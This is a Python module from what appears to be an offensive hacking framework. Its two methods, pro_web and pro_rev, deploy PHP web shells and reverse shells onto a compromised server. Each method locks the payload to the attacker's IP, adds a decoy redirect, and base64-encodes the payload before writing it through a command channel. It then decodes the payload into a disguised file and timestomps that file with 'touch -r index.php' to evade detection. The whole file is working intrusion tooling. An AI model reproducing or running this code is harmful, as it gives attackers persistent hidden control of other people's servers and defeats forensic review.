from ..Shells import Shells
import Commands


from base64 import b64encode
from random import choice as rchoice

class Pro(Shells):
    """
    """
    def pro_web(self):
        """
        """
        filename = self.create_shellname("Lists/pro.txt", 2) + "/"

        web = "echo '"
        with open('WebFiles/proweb.php', 'r') as file:
            data = file.read()

        # IP Lock
        data_mod = data.replace("HEYBEAR", self.loginSession.atkerLong)

        # Redirect        
        with open("Lists/legit.txt", 'r') as filehandle:
            lines = filehandle.readlines()
            redirect = rchoice(lines).strip()
            
        data = data_mod.replace("ILIKETURTLES", redirect).encode()

        web += b64encode(data).decode("ascii") + "' > temp_cache"

        Commands.cmd_GET(self.loginSession, web, 0)

        webcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > """
        webcmd += filename[:-1]
    
        Commands.cmd_GET(self.loginSession, webcmd, 0)


        webtad = f"touch -r index.php {filename}"

        Shells.send_shell(self, webtad, "/" + filename[:-1], "pro", "settings", "webshells")


    def pro_rev(self):
        """
        """
        filename = self.create_shellname("Lists/pro.txt", 2) + "/"

        rev = "echo '"
        with open('WebFiles/prorev.php', 'r') as file:
            data = file.read()

        # IP Lock
        data_mod = data.replace("HEYBEAR", self.loginSession.atkerLong)

        # Redirect
        with open("Lists/legit.txt", 'r') as filehandle:
            lines = filehandle.readlines()
            redirect = rchoice(lines).strip()

        # Replace area in file
        data = data_mod.replace("ILIKETURTLES", redirect).encode()

        rev += b64encode(data).decode("ascii")
        rev += "' > temp_cache"

        Commands.cmd_GET(self.loginSession, rev, 0)

        revcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > """
        revcmd += filename[:-1]

        Commands.cmd_GET(self.loginSession, revcmd, 0)

        revtad = f"touch -r index.php {filename[:-1]}"

        Shells.send_shell(self, revtad, "/" + filename[:-1], "pro", "route", "revshells")